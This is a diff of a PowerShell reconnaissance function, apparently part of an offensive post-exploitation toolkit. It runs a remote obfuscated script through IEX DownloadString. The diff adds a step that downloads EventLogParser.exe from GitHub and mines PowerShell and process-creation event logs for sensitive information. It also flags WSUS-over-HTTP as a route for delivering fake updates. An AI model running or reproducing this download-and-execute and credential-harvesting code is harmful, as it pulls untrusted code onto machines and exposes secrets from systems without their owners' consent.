@@ -289,6 +289,13 @@ function localreconmodules
             IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/view.ps1')
 
             Write-Host -ForegroundColor Yellow 'Starting local Recon phase:'
+            
+            Write-Host -ForegroundColor Yellow 'Parsing Event logs for sensitive Information:'
+            Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/EventLogParser.exe' -Outfile "$currentPath\EventLogParser.exe"
+            EventLogParser.exe eventid=4103 outfile="$currentPath\LocalRecon\EventlogSensitiveInformations.txt"
+            EventLogParser.exe eventid=4104 outfile="$currentPath\LocalRecon\EventlogSensitiveInformations.txt"
+            if (isadmin){EventLogParser.exe eventid=4688 outfile="$currentPath\LocalRecon\EventlogSensitiveInformations.txt"}
+
 
             #Check for WSUS Updates over HTTP
 	        $UseWUServer = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name UseWUServer -ErrorAction SilentlyContinue).UseWUServer
@@ -296,7 +303,7 @@ function localreconmodules
 
             if($UseWUServer -eq 1 -and $WUServer.ToLower().StartsWith("http://")) 
 	        {
-        	    Write-Host -ForegroundColor Yellow "WSUS Server over HTTP detected, most likely all hosts in this domain can get fake-Updates!"
+        	    Write-Host -ForegroundColor Yellow 'WSUS Server over HTTP detected, most likely all hosts in this domain can get fake-Updates!'
 		        echo "Wsus over http detected! Fake Updates can be delivered here. $UseWUServer / $WUServer " >> "$currentPath\LocalRecon\WsusoverHTTP.txt"
             }
 
